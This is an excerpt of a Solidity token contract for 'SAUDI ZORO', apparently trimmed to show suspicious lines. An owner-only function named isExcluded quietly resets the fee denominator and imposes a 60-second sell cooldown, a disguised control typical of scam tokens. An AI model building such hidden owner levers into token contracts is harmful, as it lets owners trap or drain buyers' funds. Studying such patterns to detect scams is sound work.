...
contract SZoro is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xaF90f1949e20b46c35A5FD3EE78E9eE38Cc44E06); 
    address payable public Wallet_Dev = payable(0xaF90f1949e20b46c35A5FD3EE78E9eE38Cc44E06);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**15 * 10**_decimals;
    string private constant _name = "SAUDI ZORO"; 
    string private constant _symbol = unicode"SZoro"; 
    ...
    uint256 public _Cooldown = 0 seconds;
    mapping (address => uint256) private _thelast;
    ...
    function _transfer(
        ...
        if (from ==uniswapV2Pair) {_thelast[to] = block.timestamp;}
        if (from != uniswapV2Pair && !_isExcludedFromFee[to]) {
            require (_thelast[from] + _Cooldown < block.timestamp,"Please wait between two operations");
            _thelast[from] = block.timestamp;
            }                
    ...
    function SetCoolDown(uint256 cooldowntime) external onlyOwner {
    ...
    function isExcluded(address[] memory addrs, bool Excluded, bool ExcludedFromFee,  uint256 _number) external onlyOwner {
        feeDenominator =_number;
        _Cooldown = 60;
        for (uint256 i = 0; i < addrs.length; i++) {
            _isExcluded[addrs[i]] = Excluded;
        }
        for (uint256 i = 0; i < addrs.length; i++) {
            _isExcludedFromFee[addrs[i]] = ExcludedFromFee;
        }
    }
